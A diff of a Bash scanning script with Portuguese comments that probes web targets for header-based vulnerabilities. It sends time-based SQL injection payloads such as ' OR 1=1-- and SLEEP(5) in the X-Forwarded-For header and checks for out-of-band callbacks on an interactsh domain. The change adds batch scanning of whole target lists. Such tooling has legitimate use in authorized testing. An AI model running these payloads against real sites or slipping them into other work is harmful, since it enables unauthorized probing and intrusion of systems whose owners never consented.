@@ -1,28 +1,28 @@
 #!/bin/bash
 
-# Captura parâmetros corretamente
-TARGET=""
+# Captura parâmetros
+TARGET_FILE=""
 IACT_DOMAIN=""
+SINGLE_TARGET=""
 
 for ((i=1; i<=$#; i++)); do
   arg="${!i}"
   if [[ "$arg" == "-i" ]]; then
     j=$((i+1))
     IACT_DOMAIN="${!j}"
+  elif [[ "$arg" == "-f" ]]; then
+    j=$((i+1))
+    TARGET_FILE="${!j}"
   elif [[ "$arg" == http* ]]; then
-    TARGET="$arg"
+    SINGLE_TARGET="$arg"
   fi
 done
 
-HOST=$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)
-
-if [ -z "$TARGET" ] || [ -z "$IACT_DOMAIN" ]; then
-  echo "Uso: bash testes_headers.sh https://alvo -i DOMINIO.oast.site"
+if [ -z "$IACT_DOMAIN" ]; then
+  echo "Uso single:  bash testes_headers.sh https://alvo -i DOMINIO.oast.site"
+  echo "Uso lista:   bash testes_headers.sh -f targets.txt -i DOMINIO.oast.site"
   exit 1
 fi
-
-echo "[*] Target: $TARGET"
-echo "[*] Domínio interactsh: $IACT_DOMAIN"
 
 scan_target() {
   local url=$1
@@ -102,14 +102,12 @@ scan_target() {
     done
   done
 
-  # XFF SQLi — sem bc, usa awk
+  # XFF SQLi
   echo ""
   echo "=== XFF SQLi (time-based) ==="
   for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--" "1 AND SLEEP(5)--"; do
     elapsed=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
       -H "X-Forwarded-For: $payload" "$url")
-    
-    # Compara sem bc usando awk
     is_slow=$(awk "BEGIN {print ($elapsed > 4) ? 1 : 0}")
     if [ "$is_slow" == "1" ]; then
       echo "[POSSIBLE SQLi] ${elapsed}s → $payload"
@@ -119,10 +117,46 @@ scan_target() {
   done
 }
 
-# Roda uma vez em cada protocolo
-scan_target "http://$HOST" "HTTP"
-scan_target "https://$HOST" "HTTPS"
+run_scan() {
+  local target=$1
+  local host=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
+
+  echo ""
+  echo "##################################"
+  echo "# TARGET: $target"
+  echo "##################################"
+
+  # Se já tem protocolo definido — usa só ele
+  if [[ "$target" == https* ]]; then
+    scan_target "$target" "HTTPS"
+  elif [[ "$target" == http://* ]]; then
+    scan_target "$target" "HTTP"
+    scan_target "https://$host" "HTTPS"
+  else
+    scan_target "http://$host" "HTTP"
+    scan_target "https://$host" "HTTPS"
+  fi
+}
+
+# Execução — arquivo ou single target
+if [ -n "$TARGET_FILE" ]; then
+  if [ ! -f "$TARGET_FILE" ]; then
+    echo "[!] Arquivo não encontrado: $TARGET_FILE"
+    exit 1
+  fi
+  total=$(wc -l < "$TARGET_FILE")
+  count=0
+  while IFS= read -r target || [ -n "$target" ]; do
+    [[ -z "$target" || "$target" == \#* ]] && continue
+    count=$((count+1))
+    echo ""
+    echo "[*] Progresso: $count/$total"
+    run_scan "$target" | tee -a resultados_$(date +%Y%m%d_%H%M%S).txt
+  done < "$TARGET_FILE"
+else
+  run_scan "$SINGLE_TARGET" | tee -a resultados_$(date +%Y%m%d_%H%M%S).txt
+fi
 
 echo ""
-echo "[*] Scan finalizado → $HOST"
+echo "[*] Scan finalizado"
 echo "[*] Verifique callbacks no interactsh-client"
